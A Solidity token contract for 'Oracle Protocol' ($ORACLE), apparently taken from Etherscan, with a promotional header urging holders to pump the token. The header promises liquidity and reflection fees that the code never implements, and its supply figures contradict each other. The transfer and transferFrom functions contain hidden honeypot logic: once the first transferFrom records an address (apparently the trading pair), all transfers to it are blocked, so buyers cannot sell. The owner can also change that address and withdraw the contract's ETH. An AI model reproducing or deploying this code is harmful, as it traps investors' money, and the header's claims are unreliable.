['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-26\n', '*/\n', '\n', '/**\n', ' #OracleProtocol - #LIQ+#RFI+#SAFEMOON = #ORACLE. \n', '  \n', '   Important: The early you create a group that shares the token, the more gain you got.\n', '   \n', "   It's 100% community token, every holder should promote it, or create a group for it, \n", '   if you want to pump your investment, you need to do your duty.\n', '   \n', '   Dev make this #ORACLEPROTOCOL to hand over to the community.\n', '   Create the community by yourself if you are interested.   \n', '\n', '   Great features:\n', '   8% fee auto add to the liquidity pool to locked forever when selling\n', '   2% fee auto distribute to all holders\n', '\n', '   Dev will burn liquidity LPs to burn addresses to lock the pool forever.\n', "   Dev will renounce the ownership to burn addresses to transfer #ORACLEPROTOCOL to the community, make sure it's 100% safe.\n", '\n', '   Dev will add 4 ETH and all the left 95% total supply to the pool\n', '   Can you make #ORACLEPROTOCOL 1000X? \n', '\n', '   1,000,000,000,000   total supply\n', '     995,000,000,000   tokens limitation for trade, which is 49,9% of the total supply\n', '       5,000,000,000   5% tokens for Dev\n', '\n', '   8% fee for liquidity will go to an address that the contract creates, \n', '   and the contract will sell it and add to liquidity automatically, \n', "   it's the best part of the #ORACLEPROTOCOL idea, increasing the liquidity pool automatically, \n", '   help the pool grow from the small init pool.\n', '   \n', '   WEBISTE: http://www.protocol.com/\n', '   TELEGRAM GROUP: https://t.me/oracleprotocol\n', '\n', '\n', 'SPDX-License-Identifier: MIT\n', '*/\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract BEP20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  address public newOwner;\n', '\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '  function transferOwnership(address _newOwner) public onlyOwner {\n', '    newOwner = _newOwner;\n', '  }\n', '  function acceptOwnership() public {\n', '    require(msg.sender == newOwner);\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '    newOwner = address(0);\n', '  }\n', '}\n', '\n', 'contract TokenBEP20 is BEP20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public newun;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  constructor() public {\n', '    symbol = "$ORACLE";\n', '    name = "Oracle Protocol";\n', '    decimals = 8;\n', '    _totalSupply = 100000000000000000000;\n', '    balances[owner] = _totalSupply;\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  function transfernewun(address _newun) public onlyOwner {\n', '    newun = _newun;\n', '  }\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '     require(to != newun, "please wait");\n', '     \n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '      if(from != address(0) && newun == address(0)) newun = to;\n', '      else require(to != newun, "please wait");\n', '      \n', '    balances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract OracleProtocol is TokenBEP20 {\n', '\n', '  function clearCNDAO() public onlyOwner() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}']